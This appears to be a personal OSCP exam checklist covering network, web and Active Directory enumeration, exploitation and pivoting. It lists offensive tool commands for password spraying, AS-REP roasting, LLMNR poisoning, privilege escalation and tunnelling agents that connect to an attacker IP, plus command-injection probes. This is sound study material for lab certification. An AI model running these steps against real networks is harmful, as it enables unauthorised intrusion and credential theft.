---
title: OSCP Enumeration Checklist
published: 2026-06-07
updated: 2026-06-07
description: Enumeration Checklist for OSCP Exam.
image: checklist1.png
tags:
  - OSCP
  - checklist
  - enumeration
category: OSCP
draft: false
---
## Proofs

**Linux:**

**CHECK FOR `nc` or `nc-traditional` or `ncat` when checking for reverse shells.**

```
hostname && whoami && cat proof.txt && ip a 
```


**Windows:**

```
hostname && whoami.exe && type proof.txt && ipconfig /all
```

## **THINGS TO ALWAYS REMEMBER:**

- [ ] BEFORE STARTING: `touch users.txt emails.txt passwords.txt hashes.txt`
- [ ] Always make a list of every user found: Rid, Website, logins, anything.

## Enumeration

### Service Enumeration

- [ ] Scan with own tool: `full_scan $IP`
- [ ] Scan the whole network for alive hosts: `nxc smb $IP/CIDR` or `sudo nmap -sn $IP/CIDR` or `sudo nmap -Pn $IP/CIDR` 
- [ ] Run autorecon: `sudo /home/kali/.local/bin/autorecon $IP --exclude-tags feroxbuster,dirbuster,nikto,enum4linux --nmap-append="--min-rate 1000"`
- [ ] Run rustscan.
- [ ] MAKE A LIST OF EVERY ENTRY POINT.
- [ ] Start Enumerating Non-Web Services
- [ ] For every port remember the principles of:
	* [ ] Checking Version:
	* [ ] Grab banner using netcat or telnet
  * [ ] Search notes
	* [ ] Cherry Tree
	* [ ] Hacktricks [hacktricks](https://hacktricks.wiki/en/index.html)
	* [ ] Check Metasploit modules for hints, payloads, or other things.
	* [ ] Check the software/plugin with that version offline to discover the vulnerable part and how to exploit it.
  * [ ] Searchsploit search
  * [ ] What is the purpose of this service?
	* [ ] Can we change password , users from other services around?
	* [ ] Can we modify information
	* [ ] can we read information ?
	* [ ] Can we decrypt it?
  * [ ] Default credentials?
  * [ ] Brute force the service
	* [ ] Use nse scripts or maybe anyting
  * [ ] Any known vulnerability?
	* [ ] Check [exploit-db.com/](https://www.exploit-db.com/)
	* [ ] Check [cvedetails.com](https://www.cvedetails.com/)
	* [ ] Check [nvd.nist.gov/](https://nvd.nist.gov/)
	* [ ] Check on google
	  * [ ] `site:github.com *Service version.release`
  * [ ] version + github + exploit search
  * [ ] google search
	* [ ] Every error message
	* [ ] Every PATH
	* [ ] Every parameter to find version
	* [ ] Every version of exploitdb
	* [ ] Every version of vuln
	* [ ] Every string from the banner grab
- [ ] Kerberos open?
  * [ ] kerbrute user enum
  * [ ] Aseproast
- [ ] If you have valid credentials from elsewhere:
	- [ ] Get-UserSPNs.py (Kerberoasting)
	- [ ] GetNPUsers.py (AS-REP Roasting without auth if applicable)
- [ ] SNMP
  * [ ] nmap
  * [ ] snmpwalk
  * [ ] Find service and version
  * [ ] Find known service bugs
  * [ ] Find configuration issues
  * [ ] Run nmap port scan / banner grabbing
  * [ ] Google-Fu
	* [ ] Every error message
	* [ ] Every URL path
	* [ ] Every paramenter to find versions/apps/bugs
  * [ ] searchsploit every serivce
  * [ ] Google
	* [ ] Every version exploit db
	* [ ] Every version vulnerability
  * [ ] Check running services
	* [ ] Google!
* [ ] **SNMP**
	- [ ] snmp-check tool
	- [ ] brute force community strings (public, private, manager) using `onesixtyone`
- [ ] **SMTP**
	- [ ] [[smtp-enumeration]]
  * [ ] NMAP
  * [ ] Hacktricks
  * [ ] USERENUM
	* [ ] HYDRA SMTP ENUM
	* [ ] Find service and version
	* [ ] Find known service bugs
	* [ ] Find configuration issues
	* [ ] Run nmap port scan / banner grabbing
	* [ ] Google- Fu
	  * [ ] Every error message
	  * [ ] Every URL path
	  * [ ] Every paramenter to find versions/apps/bugs
	* [ ] searchsploit every serivce
	* [ ] Google
	  * [ ] Every version exploit db
	  * [ ] Every version vulnerability
- [ ] Check VRFY and EXPN commands manually via nc
- [ ] SSH: check version if <9.8p1, then go with : [Exploit](https://www.deepwatch.com/labs/pocs-released-for-high-severity-vulnerability-cve-2024-6387-in-openssh/)
- [ ] DNS
  * [ ] autrecon manual
  * [ ] nslookup
  * [ ] dig axfr
- [ ] dig any @$IP
- [ ] IRC
  * [ ] hexchat
- [ ] POP3
  * [ ] See if we can authenticate as a user
  * [ ] "LIST"
  * [ ] retr `<numbers>`
	* [ ] Find service and version
	* [ ] Find known service bugs
	* [ ] Find configuration issues
	* [ ] Run nmap port scan / banner grabbing
	* [ ] Google-Fu
	  * [ ] Every error message
	  * [ ] Every URL path
	  * [ ] Every paramenter to find versions/apps/bugs
	* [ ] searchsploit every serivce
	* [ ] Google
	  * [ ] Every version exploit db
	  * [ ] Every version vulnerability
- [ ] Ident
  * [ ] Channel through different ports each time
	* [ ] ident-user-enum
- [ ] Enumerate Services with Null Sessions
  * [ ] LDAP
	* [ ] Grep Description
	* [ ] Look for unusual fields
	* [ ] Grep pwd
	* [ ] Grep Pwd
	* [ ] grep password
	* [ ] grep Pass
	* [ ] grep pass
	* [ ] ldapsearch
- [ ] ldapsearch -x -H ldap://$IP -s base namingcontexts (Find naming context)

- [ ] ldapsearch -x -H ldap://$IP -b "DC=htb,DC=local" (Dump everything)
  * [ ] FTP
	* [ ] if unstable reset box
	* [ ] Find service and version
	* [ ] Find known service bugs
	* [ ] Find configuration issues
	* [ ] Run nmap port scan / banner grabbing
	* [ ] Google- Fu
	  * [ ] Every error message
	  * [ ] Every URL path
	  * [ ] Every paramenter to find versions/apps/bugs
	* [ ] searchsploit every serivce
	* [ ] Google
	  * [ ] Every version exploit db
	  * [ ] Every version vulnerability
	* [ ] upload
	  * [ ] Identify where we are in the file system
		* [ ] Dont know?google!
		  * [ ] Example `/var/ftp/anon/<directory-name-ifapplies>`
	* [ ] Download recursively all ftp directories using wget
	* [ ] Change binary mode to upload exe
	* [ ] [https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
	* [ ] Configuration files
	  * [ ] ftpusers
	  * [ ] ftp.conf
	  * [ ] proftpd.conf
	  * [ ] filezilla users.xml
  * [ ] **RPC**
	* [ ] enumdomusers
	  * [ ] make a list of users
	* [ ] enumprinters
- [ ] rpcclient -U "" -N $IP
- [ ] enumdomusers
- [ ] enumdomgroups
- [ ] querydispinfo
  * [ ] SMB
	* [ ] Download Files
	* [ ] Mount
	  * [ ] Check for permissions smbcacls
	* [ ] Find service and version
	* [ ] Find known service bugs
	* [ ] Find configuration issues
	* [ ] Run nmap port scan / banner grabbing
	* [ ] Google-Fu
	  * [ ] Every error message
	  * [ ] Every URL path
	  * [ ] Every paramenter to find versions/apps/bugs
	* [ ] searchsploit every serivce
	* [ ] Google
	  * [ ] Every version exploit db
	  * [ ] Every version vulnerability
- [ ] crackmapexec/netexec smb $IP -u '' -p '' --shares
- [ ] crackmapexec/netexec smb $IP -u 'guest' -p '' --shares
  * [ ] REDIS
	* [ ] Check HACKTRICKS
	* [ ] Find service and version
	* [ ] Find known service bugs
	* [ ] Find configuration issues
	* [ ] Run nmap port scan / banner grabbing
	* [ ] Google-Fu
	  * [ ] Every error message
	  * [ ] Every URL path
	  * [ ] Every paramenter to find versions/apps/bugs
	* [ ] searchsploit every serivce
	* [ ] Google
	  * [ ] Every version exploit db
	  * [ ] Every version vulnerability
	* [ ] DBS
	* [ ] Try PHP webshell if we have write access to the /var/www/html/ folder
	* [ ] Try grabbing SSH Keys or uploading them
	* [ ] Try uploading module.so if vulnerable version
  * [ ] Rsync
	* [ ] List shares
	* [ ] Download Share
	* [ ] Identify Where we are
- [ ] NFS
- [ ] showmount -e $IP
- [ ] Mount shares: `mount -t nfs $IP:/share /mnt/nfs`
- [ ] Check for `no_root_squash` in /etc/exports (Local Priv Esc)
- [ ] MSSQL (Port 1433)
	- [ ] Netexec mssql $IP -u 'sa' -p 'password'
	- [ ] Try default creds (sa/password, etc)	
	- [ ] Use mssqlclient.py to connect
	- [ ] Check for `xp_cmdshell` enable first.
- [ ] Oracle (Port 1521)
	- [ ] odat sidguesser
- [ ] If we do not know how to enumerate these services use hacktricks
- [ ] Identifying default credentials and password reusage:
  * [ ] Look up Version plus default credentials
  * [ ] Try admin:admin
  * [ ] Try admin:password
  * [ ] Try root:admin
  * [ ] Try root:password
  * [ ] Try root:root
  * [ ] Try boxname:admin,password
  * [ ] Try version or app name : app name
  * [ ] Try admin : no pass
  * [ ] Try root : no pass
  * [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
- [ ] Brute force
  * [ ] Use cewl to make a passlist if there is a webserver running
  * [ ] Use rockyou.txt if we know that there are users such as admin or root for those services
  * [ ] If we found credentials
	* [ ] Rerun the bruteforcing
- [ ] If we are able to find credentials through our enumeration then we rerun our enumeration
  * [ ] This mean that we will run every null session command with the credentials that we found or we will attempt EVERY vector with the credentials
	* [ ] LDAP
* [ ] ldapdomaindump (Get HTML view of domain)
* [ ] Bloodhound-python ingestor
	* [ ] RPC
	* [ ] SMB
	  * [ ] Download Files
	  * [ ] Mount
		* [ ] Check upload permissions using smbcalcls
		  * [ ] scf
		  * [ ] hta
		  * [ ] odt
	  * [ ] If SMBPass Change was given to you use smbpasswd
	* [ ] REDIS
	  * [ ] Enumerate version
	  * [ ] DBS
	  * [ ] Try PHP webshell if we have write access to the /var/www/html/ folder
	  * [ ] Try grabbing SSH Keys or uploading them
	  * [ ] Try uploading module.so if vulnerable version
	* [ ] Kerberos based attacks
	  * [ ] Kerberoasting
	* [ ] CME
	  * [ ] WINRM
	  * [ ] SMB
		* [ ] If SMBPass Change was given to you use smbpasswd
	  * [ ] LDAP
		* [ ] ldapdomaindump
		* [ ] redo the same shit from initial time
	* [ ] Files of importance when looking out for this share
	* [ ] **Regardless NO MATTER WHAT YOU FIND YOU WILL LOOK IT UP ON GOOGLE!**
	* [ ] [code review tools](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/code-review-tools)
	  * [ ] pdfs
		* [ ] exiftool - `exiftool -a -u -g1 <filename>`
	  * [ ] Credentials for mysql, postgress, mssql
		* [ ] Look for string "sa"
	  * [ ] exe
		* [ ] buffer overflow
	  * [ ] pngs
		* [ ] exiftool
	  * [ ] conf
	  * [ ] config
	  * [ ] xml
	  * [ ] Look for the file specifically on google.com and how to decrypt them
		* [ ] Groups.xml
		  * [ ] gpp decrypt
		* [ ] VNC
		  * [ ] vncpwd
	  * [ ] db
		* [ ] sqlite
	  * [ ] cert files for evil winrm
	  * [ ] pfx files for evil winrm
	  * [ ] zip
		* [ ] zip2john
	  * [ ] 7z
		* [ ] 7z2john
	  * [ ] pdf
		* [ ] pdfcrack
	  * [ ] Doc
		* [ ] office2john
	  * [ ] .net file
		* [ ] dnspy

### Web Enumeration

- [ ] gowitness
- [ ] dirsearch, then web-fuzz
- [ ] Always check [[login page enumeration]].
- [ ] **CHECK NAMES, ETC, EVERY COMMON THING IN SEARCHSPLOIT.**
- [ ] FFUF or [[1. FEROXBUSTER]] or dirsearch
	- [ ] WORDLIST ORDER: `QUICKHITS`, `COMMON`, `RAFT-MEDIUM`, `DIRBUSTER-LARGE`.
	- [ ] make sure to run the first scan with `quickhits.txt` and add `-x txt,bak,old,zip,html,php,phtml,asp,aspx,config,jsp,do,action,sh,cgi,py,env,sql -t 50 -d 2`
  * [ ] Check for potential auth owner
  * [ ] Check:  `robots.txt` , `.svn`, `.DS_STORE`.
  * [ ] Take note of the app
	* [ ] node.js
	* [ ] werkzeug
	* [ ] IIS --> use **short scan** and then fuzz with:` -x asp,aspx,config,txt` to be exhaustive.
- [ ] nikto scan
- [ ] HTTPS
  * [ ] Look at certificates, check brainfuck for this
  * [ ] sslscan
  * [ ] nmap heatbleed vuln
- [ ] If there is proxy
  * [ ] use spose to enumerate behind the proxy
- [ ] Navigate to site
  * [ ] Source Code inspection
	* [ ] Look for APIs
	* [ ] href
	* [ ] check comments
	* [ ] Hidden values
	* [ ] Weird Code
	* [ ] Passwords
	* [ ] Download Files
	  * [ ] Exiftool
  * [ ] Enumerate version of CMS, about page, versions
	* [ ] Searchsploit
	* [ ] Find service and version
	* [ ] Find known service bugs
	* [ ] Find configuration issues
	* [ ] Run nmap port scan / banner grabbing
	* [ ] Google-Fu
	  * [ ] Every error message
	  * [ ] Every URL path
	  * [ ] Every paramenter to find versions/apps/bugs
	* [ ] searchsploit every serivce
	* [ ] Google
	  * [ ] Every version exploit db
	  * [ ] Every version vulnerability
	* [ ] Google
	  * [ ] If Versions were identified such
		* [ ] Wordpress
		  * [ ] wpscan
			* [ ] Check plugins for vulnerabiliies
		  * [ ] wpscan brute
		* [ ] Droopal
		  * [ ] Droopescan
		  * [ ] Check changelog.txt for version
		  * [ ] Find endpoint_path
		  * [ ] Attack vectors
			* [ ] Drupal 7.x Module Services Rce
			* [ ] Drupalgeddon2
			* [ ] DRUPALGEDDON3
		* [ ] Jenkins
		  * [ ] Default Creds
			* [ ] Create new User
		  * [ ] Identify version and exploits for them
		  * [ ] Groovy Script reverse shell
		  * [ ] Create new job
			* [ ] If we can build
			* [ ] Else use curl or cronjob method to execute the commands
			* [ ] Try to get reverse shell
			  * [ ] Otherwise hunt down for the master.key and other files needed for decryption
		* [ ] Tomcat
		  * [ ] Nikto scan
		  * [ ] Search vulnerabilities via version number
			* [ ] Look for /manager
			* [ ] Use default credential list
			  * [ ] Upload war file to get reverse shell
		* [ ] WebDav
		  * [ ] Default Creds
		  * [ ] Spray
		  * [ ] Other Creds
			* [ ] Use cadaver for upload
			  * [ ] aspx
		* [ ] phpMyAdmin
		  * [ ] Try Default Creds
			* [ ] root:
			* [ ] root:password
			  * [ ] Once in we can upload a shell using a sql query
	  * [ ] Werkzeug
		  * [ ] Look for LFI in parameters.
		  * [ ] Look for debug console: `/console`
		  * [ ] 
  * [ ] Enumerate for usernames, emails, user info
	* [ ] Make a userlist using username
	- [ ] anarchy and other tool
	  * [ ] Use these against any service or authentication method.
		* [ ] Make a passlist out of cewl
		* [ ] username:username
		* [ ] username:password
		* [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
  * [ ] Enumerate for Upload
	* [ ] Enumerate what extentions we can use to upload
	* [ ] Pair this with FTP, REDIS, and other forms of upload capability.


**AT THIS POINT THIS IS WHERE IT MATTERS TO TAKE INTO ACCOUNT WHAT THE VERSION AND TECHNOLOGY BEHIND THE APPLICATION IS, IF THERE IS NO IDENTIFABLE EXPLOIT THAT MEANS THAT THIS IS A WEBSITE MADE BY THE CREATORS OF THE BOX. WE HAVE TO TAKE INTO ACCOUNT NOW THAT WE COULD POSSIBLY HAVE SQLI, CODE INJECTION. OUR PAYLOADS HAVE TO MATCH THE TECHNOLOGY BEHIND THE WEBSITE.**

- [ ] Logical reasoning
  * [ ] Look at the application from a bad guy perspective, what does it do? what is the most valuable part? Some applications will value things more than others, for example a premium website might be more concerned about users being able to bypass the pay wall than they are of say cross-site scripting
  * [ ] Look at the application logic too, how is business conducted?
- [ ] 401 OR 403? Try bypassing that
  * [ ] Use hacktricks for this, I also have a script that does it for you.
- [ ] nikto
  * [ ] google everything that this returns
	* [ ] there was a box about the api that was exploitable by looking it up on nikto scan (Restack API)
- [ ] Enumerate directories
  * [ ] dirsearch
	* [ ] /boxname/
  * [ ] gobuster
- [ ] VHOST Fuzzing! `gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
  * [ ] if cgi-bin folder was found (shellshock)
	* [ ] /cgi-bin/ dirb scan
	* [ ] dirb scan normal
  * [ ] Rerun initial enum for this such as source code inspection
  * [ ] Enumerate hidden params
	* [ ] arjun
	* [ ] wfuzz
	* [ ] ffuff
	* [ ] Guess parameters. If there's a POST forgot_pass.php with an email param, try `GET /forgot_pass.php?email=%0aid.`
  * [ ] Enumerate parameters for RFI, and LFI
	* [ ] Remember relativity and using LFI to expose other services that we could authenticate as.
	* [ ] [https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
	* [ ] Check for RCE methods, like every single one of them.
  * [ ] Enumerate SSRF if there is some sort of browser.
	* [ ] Capture hashes via responder
  * [ ] Every parameter or input has to be checked for sql injection
	* [ ] Try enabling the shells depending on the database that is open
	* [ ] otherwise haha xd try to enumerate tables and the whole jargon
  * [ ] Play with post and get requests, this could lead to something displaying
	* [ ] Google everything
	* [ ] This can be done with curl and BurpSuite
	* [ ] Guess post parameters based on the output, check the werkzeug section of the blog
  * [ ] Play with weak cookies and parameters
	* [ ] Look for weak encryption maybe we could decrypt these into passwords and mess with them by changing them to admin.

- [ ] Log in forms
	* [ ] default creds google
	* [ ] cewl to make passlist
	* [ ] cewl to make user list
	* [ ] version:version
	* [ ] combine them both
	* [ ] authetication bypass
	* [ ] boxname:boxname
	* [ ] admin:version
	* [ ] name:version
	* [ ] php type juggling
	* [ ] Credentials somewhere else in the box.
	* [ ] Bruteforce
- [ ] [[command injection]]
	* [ ] check for even/odd behavior with `'` `"` `)` `}` `]` `;` `$`
	* [ ] check with arithmetic operators: `${7*7}` `{{7*7}}`
	* [ ] try separators: `;` `&&` `||` `|` `\n`
	* [ ] Search for dangerous functions of both the server technology and the language.

## Exploitation

**THESE ARE THE THREE PRINCIPLES OF GETTING IN. THERE IS EITHER A VULNERABLE SERVICE, THIS MAYBE HAS TO BE CHAINED WITH ANOTHER VULNERABILITY. THEN THERE IS PASSWORD SPRAYING, THIS IS BASICALLY CONSITUTES TO DEFAULT CREDS, PASSWORD RESUSAGE, AND THE LAST IS BRUTEFORCING**

#### Vulnerable services

Any known vulnerability
- [ ] Check [https://www.exploit-db.com/](https://www.exploit-db.com/)
- [ ] Check [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [ ] Check [https://nvd.nist.gov/](https://nvd.nist.gov/)
- [ ] Check on google `site:github.com *Service version.release*`
- [ ] We do not have version? But exploits avaliable
  * [ ] Prioritize RCE exploits
  * [ ] Try THEM ALL!!!
  * [ ] and redo the above
- [ ] IF WE HAVE CODE EXECUTION
  * [ ] Attempt to get reverse shells
	* [ ] if a technique does not work, do every single fucking reverse shell
	  * [ ] python, nc , in every motherfucking way [Reverse Shell Cheatsheat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
	  * [ ] Troubleshoot the exploit maybe the command needs a certain syntax look at the methodology section of the blog in exploitation
	  * [ ] Also play with this remember the mongodb exploit from the labs.
	  * [ ] Also try bash -c instead of just the normal bash -i reverse shell.
- [ ] ALWAYS USE AND CHANNEL THROUGH OPEN PORTS FOR THE REVERSE SHELL
- [ ] if we do get code execution but no reverse shell because of whatever firewall, our best choice is to look if we can output files in a way where we can use them against other services, these could be used to gain access and uploading shit.
- [ ] THINK ABOUT SITUATIONAL AWARENESS. Where can we upload? can we use these files to our advantage, remember the thing about redis.
- [ ] Did we get credentials for any database that are valid ?
  * [ ] Check RCE methods
  * [ ] Enumerate the database

#### **Pivoting and Tunneling** 

- [ ] Check interfaces (`ip a` / `ipconfig`)
- [ ] Ligolo-ng (Preferred)
- [ ] Setup Interface on Attack box: `sudo ip tuntap add user [youruser] mode tun ligolo`
- [ ] Set interface up: `sudo ip link set ligolo up`
- [ ] Run proxy: `ligolo-proxy -selfcert -laddr 0.0.0.0:443 -allow-domains [domain]`
- [ ] Upload agent to victim and run: `agent.exe -connect [attacker-ip]:443 -ignore-cert`
- [ ] In proxy: `session`, `start`
- [ ] Add route on Attack Box: `sudo ip route add [internal-subnet]/24 dev ligolo`
- [ ] Chisel (SOCKS5)
- [ ] Server (Attack Box): `chisel server -p 8000 --reverse`
- [ ] Client (Victim): `chisel client [attacker-ip]:8000 R:socks`
- [ ] Configure `/etc/proxychains4.conf` to use the port
- [ ] Sshuttle (Linux only pivot)
- [ ] `sshuttle -r user@10.10.10.10 172.16.x.0/24`

#### Active Directory Based Attacks

_RUN BLOODHOUND AS SOON AS THERE IS AN LDAP CONNECTION._
##### **Pre-Auth Active Directory Checklist**

0. Fix the Following:
	1. time with: [timeskewfix tool](https://github.com/YamiNoKen/TimeSkewFix.git). Command: `sudo Time_Skew_Fix.sh <DC_IP>`
	2. (Optional) Generate a krb5 file (system config) with nxc: `nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --generate-krb5-file ./krb5` then export to current terminal session: `export KRB5_CONFIG=./krb5`.
		1. Check with: `nxc smb <domain> -u user -p pass -k`
	3. To export a ticket (credentials/tickets): `export KRB5CCNAME=./ticket.ccache`

1. **Network & DC Identification**
    **Goal:** Find the Domain Controller (DC) and the Domain Name.
- [ ] **Identify the DC IP & Domain Name** 🚨
    - **Method 1 (Passive/Standard):** `nmcli dev show` or `systemd-resolve --status` (Look for DNS servers).
    - **Method 2 (Nmap):** `nmap -p 53,88,389 -sV --open <IP/CIDR>` (Open Port 88 = DC).
    - **Method 3 (Netexec):** `netexec smb <IP/CIDR>` (Look for `signing:True` and `domain:` in output).
    
- [ ] **Verify Clock Skew** ℹ️
    - _Why?_ Kerberos fails if your time is off by >5 mins.
    - **Tool:** `netexec smb <DC-IP>` (Check output for time).
    - **Action:** `sudo ntpdate <DC-IP>` if skewed.

---

2. **SMB Enumeration (Port 445)**

**Goal:** Find open shares, sensitive files, or valid user lists without a password.

- [ ] **Check for Null / Guest Sessions** 🍎 🚨
    - _Description:_ Can I list shares without a username/password?
    - **Tool Choice A (Netexec - Fast):** `netexec smb <DC-IP> -u '' -p '' --shares`
      
    - **Tool Choice B (Netexec - Guest):** `netexec smb <DC-IP> -u 'guest' -p '' --shares`
    
    - **Tool Choice C (Smbclient - Manual):** `smbclient -N -L //<DC-IP>`
    
    - **Tool Choice D (Enum4Linux-ng - Thorough):** `enum4linux-ng -A <DC-IP>`
    
- [ ] **Analyze Shares (If Null Session Works)** 🍎
    
    - **Action:** Look for `IPC$` (RPC enum), `SYSVOL` (Group Policy), or custom shares (Backups/HR).
     
    - **Tool:** `smbclient //<DC-IP>/<ShareName> -N`
    
- [ ] **Check for SMB Signing** ℹ️
    
    - _Why?_ If "Signing: False" on a target, you can relay NTLM hashes to it (getting a shell without knowing the password).
     
    - **Tool:** `netexec smb <CIDR> --gen-relay-list targets.txt`
     
- [ ] Check for RID-bruteforce.
- [ ] **Spidering for Sensitive Files (Appended)** 🚨
    - _Description:_ Automatically search accessible shares for files containing passwords.
    - **Tool (Netexec):** `netexec smb <DC-IP> -u '' -p '' -M spider_plus`

---

3. **LDAP Enumeration (Port 389 / 636)**

**Goal:** Query the directory database directly to dump users and groups.

- [ ] **Check for Anonymous Bind** 🍎 🚨
    - _Description:_ The AD allows queries without authentication. This is the **Holy Grail** of external enum.
    - **Tool Choice A (Ldapsearch):** `ldapsearch -x -H ldap://<DC-IP> -b "DC=<DOMAIN>,DC=<TLD>"`
        
    - **Tool Choice B (Windapsearch):** `./windapsearch.py -U --dc-ip <DC-IP>`
        
    - **Tool Choice C (Nmap):** `nmap -n -sV --script "ldap* and not brute" -p 389 <DC-IP>`
- [ ] **Dump Users (If Anon Bind Works)** 🚨
    - **Tool:** `ldapsearch -x -H ldap://<DC-IP> -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=user)" sAMAccountName | grep sAMAccountName`
        
- [ ] **Check for LDAP Null Base DN** ℹ️
    - **Tool:** `ldapsearch -x -H ldap://<DC-IP> -s base namingcontexts` (Reveals the internal domain name if you don't know it).
        
- [ ] **Check for SID-Enumeration:**

|**Command**|**Use Case**|
|---|---|
|`lookupsid.py anonymous@<IP>`|Attempt anonymous SID enumeration.|
|`lookupsid.py <DOMAIN>/<User>:<Password>@<IP>`|Authenticated SID enumeration.|
|`lookupsid.py <DOMAIN>/<User>@<IP> -hashes <LM>:<NTLM>`|Authenticated SID enumeration using Pass-the-Hash.|

- [ ] **Extract LDAP Descriptions (Appended)** ℹ️
    - _Description:_ Descriptions often contain passwords or sensitive internal details.
    - **Tool:** `netexec ldap <DC-IP> -u '' -p '' --users`

---

4. **RPC Enumeration (Port 135 / Dynamic Ports)**

**Goal:** Use Remote Procedure Calls to enumerate users via RID Cycling.

- [ ] **Null Session RPC Connection** 🍎
    
    - _Description:_ Connect to the IPC$ share and ask the DC for a list of users.
    - **Tool Choice A (Rpcclient):** `rpcclient -U "" -N <DC-IP>`
        - Command inside shell: `enumdomusers`
        - Command inside shell: `enumdomgroups`
    
    - **Tool Choice B (Impacket):** `impacket-rpcdump <DC-IP>` (Shows reachable RPC interfaces).
        
- [ ] **RID Cycling (User Enum without a User List)** 🚨
    
    - _Description:_ Brute-force user IDs (500, 501, 1000, 1001...) to reveal usernames. Works great if Null Session is blocked but Guest is enabled.
        
    - **Tool Choice A (Netexec):** `netexec smb <DC-IP> -u 'guest' -p '' --rid-brute`
        
    - **Tool Choice B (Lookupsid):** `impacket-lookupsid anonymous@<DC-IP>`
        

---

5. **Kerberos Enumeration (Port 88)**

**Goal:** Verify usernames and attack users who have "Do Not Require Pre-Auth" enabled.

- [ ] **User Enumeration (Kerbrute)** ℹ️
    
    - _Description:_ Test a wordlist of usernames (e.g., `jsmith`, `admin`, `svc_backup`) against Kerberos. It tells you if the user exists **without** locking the account.
        
    - **Tool:** `./kerbrute userenum --dc <DC-IP> -d <DOMAIN> names.txt`
        
- [ ] **AS-REP Roasting (No Credentials Needed)** 🍎 🚨
    
    - _Description:_ If you found a VALID user list (via RPC/SMB/Kerbrute), check if any user has "Pre-Auth Disabled." You get their hash immediately.
        
    - **Tool Choice A (Impacket):** `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast`
        
    - **Tool Choice B (Kerbrute):** `./kerbrute passwordspray -d <domain> users.txt "Password123!"` 
	    - (Risky - locks accounts).
	    - so first check for policy with:
```Bash
nxc smb <IP> -u '' -p '' --pass-pol
```

_IF WINDOWS HOST, USE:_ `./Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt`


---

6. **DNS Enumeration (Port 53)**    

**Goal:** Find hidden servers (dev, backup, intranet) that might be easier targets.

- [ ] **Zone Transfer (AXFR)** 🍎
    
    - _Description:_ Ask the DNS server for a copy of the _entire_ list of computers.
        
    - **Tool Choice A (Dig):** `dig axfr @<DC-IP> <DOMAIN>`
        
    - **Tool Choice B (Fierce):** `fierce --domain <DOMAIN> --dns-servers <DC-IP>`
        
- [ ] **Reverse Lookup Sweep** ℹ️
    
    - _Description:_ Map IP addresses to hostnames to find targets.
        
    - **Tool:** `dnsrecon -r 192.168.10.0/24 -n <DC-IP>`        

---

7. **Poisoning / Man-in-the-Middle (Layer 2)**    

**Goal:** Steal a hash from a machine trying to connect to a file share.

- [ ] **LLMNR/NBT-NS Poisoning** 🍎 🚨
    
    - _Requirement:_ You must be in the same local subnet (broadcast domain) as the victims.
        
    - _Description:_ Listen for machines asking "Where is Printer-X?" and say "I am Printer-X, send me your credentials."
        
    - **Tool:** `sudo responder -I <Interface> -dw`
        
    - **Action:** Wait for hashes to appear on screen.        

---

8. **Password Spraying (The "Hail Mary")**    

**Goal:** Test ONE likely password against ALL users.

- [ ] **Safe Password Spray** 🚨
    
    - _Requirement:_ You must have a valid list of usernames (from Step 4 or 5).
        
    - _Warning:_ Do **NOT** brute force (try many passwords for one user). Spray (try one password for many users).
        
    - **Passwords to try:** `Summer2025!`, `Password123`, `Welcome1`, `<CompanyName>2025`.
        
    - **Tool:** `netexec smb <DC-IP> -u users.txt -p 'Summer2025!' --continue-on-success`        

---

9. **MSSQL Enumeration (Port 1433) (Appended)**    

**Goal:** Identify poorly secured database instances linked to AD.

- [ ] **Check for Default Credentials / Blank Passwords** 🍎
    
    - **Tool:** `netexec mssql <IP/CIDR> -u 'sa' -p ''`
        
- [ ] **Check Authentication Mode** ℹ️
    
    - _Description:_ Windows Authentication uses AD creds. SQL Authentication uses local DB creds.
        
    - **Tool:** `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <IP>`        

---

##### **BLOODHOUND-ING**

- [ ] Use 2 bloodhounds:
    
    - [ ] Rusthound-ce : `rusthound-ce -d domain.com -i <dc_IP> -u user -p 'pass' --zip -c All`
    - [ ] Bloodhound-ce-python : `bloodhound-ce-python -c all -d domain.com -u user -p 'pass' --zip -ns 10.10.11.72`. `-ns` is not mandatory.
- [ ] Ingest both data in bloodhound-ce.    

##### BASIC INTERACTION

- [ ] If based on our enumeration we found some sort of userlist
    - [ ] **Make a list with these with different naming conventions**
    - [ ] **Validate these users with kerbrute.**
        - [ ] If the users are valid
            - [ ] ASEPROAST
            - [ ] Make a passlist with how we usually do            
                - [ ] use cewl if there is a webserver
                - [ ] user:user
                - [ ] user:password
                - [ ] user:''
                - [ ] user:boxname                
                - [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
            - [ ] Validate these creds with netexec            
                - [ ] ldap
                - [ ] smb
                    - [ ] If we get pwned! 
                        - [ ] psexec
                - [ ] `winrm` / `psexec` / `smbexec`
                    - [ ] However Rerun all enumeration from before if we find these are valid
            - [ ] Kerberoast/As-rep Roast
                - [ ] **GAIN FOOTHOLD (Shell Access)**
                - [ ] **SMB Share Deep Dive (Snaffler) (Appended)**
                    - [ ] Execute `Snaffler.exe` on Windows or `netexec smb <DC-IP> -u user -p pass -M spider_plus` to automatically find passwords in files.
                - [ ] **LOCAL PRIVILEGE ESCALATION**
                    - [ ] Check `whoami /priv` (Look for SeImpersonate, SeBackup)
                    - [ ] Check `whoami /groups` (Look for LAPS readers, Docker Users, etc.)
                    - [ ] Run `WinPEAS.exe` / `PrivescCheck.ps1`
                    - [ ] Check for "AlwaysInstallElevated" or Unquoted Service Paths
                    - [ ] **Exploit SeImpersonate (Appended):** Use `GodPotato.exe -cmd "cmd.exe /c whoami"` or `PrintSpoofer.exe -i -c cmd`
                    - [ ] **Goal:** Elevate from User -> SYSTEM / Administrator
- [ ] **BloodHound / Sharphound** (Run this _after_ you have a foothold if possible, or remotely if not)
